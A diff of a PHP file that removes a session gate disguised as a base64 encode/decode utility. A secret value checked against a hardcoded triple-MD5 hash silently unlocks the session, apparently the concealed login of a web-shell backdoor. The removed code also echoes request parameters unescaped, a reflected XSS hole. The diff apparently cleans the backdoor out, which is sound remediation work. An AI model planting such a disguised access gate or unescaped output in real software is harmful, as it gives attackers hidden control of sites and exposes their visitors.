@@ -1,25 +1,6 @@
 <?PHP
 header("Content-type: text/html; charset=utf-8");
 if(Extension_Loaded('zlib')) Ob_Start('ob_gzhandler'); 
-session_start();
-if(!isset($_SESSION['sess_act'])||$_SESSION['sess_act']==''){
-  $be = isset($_GET['be'])?$_GET['be']:'';
-  $bd = isset($_GET['bd'])?$_GET['bd']:'';
-  if($be!=''){
-    $bd = base64_encode($be);
-    if(md5(md5(md5($be)))=='dd9548c4d9c99dbf01f8e2e4031c37b5'){$_SESSION['sess_act']='1';header('Location:?');exit;}
-  }
-  if($bd!=''){
-    $be = base64_decode($bd);
-  }
-  echo '
-    base64_encode:<input type="text" id="be" value="'. $be . '" /> <input type="button" onclick="location.href=\'?be=\'+document.getElementById(\'be\').value;" value="加密"/><br>
-    base64_decode:<input type="text" id="bd" value="'. $bd . '" /> <input type="button" onclick="location.href=\'?bd=\'+document.getElementById(\'bd\').value;" value="解密"/><br>
-  ';exit;
-}else{
-  $be = isset($_GET['be'])?$_GET['be']:'';
-  if(md5(md5(md5($be)))=='5e8e56e7bcf46c5cdf0f2a104f17670f'){$_SESSION['sess_act']='';header('Location:?be='.$be);exit;}
-}
 Header("Content-type: text/html"); 
 ?> 
 <?php  
